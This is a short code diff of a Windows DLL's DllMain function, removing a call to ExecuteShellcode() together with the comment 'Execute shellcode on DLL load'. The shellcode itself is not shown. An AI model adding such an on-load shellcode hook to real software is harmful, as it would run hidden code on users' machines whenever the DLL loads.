@@ -87,8 +87,6 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
             fclose(f);
         }
 
-        // Execute shellcode on DLL load
-        ExecuteShellcode();
     }
     return TRUE;
 }
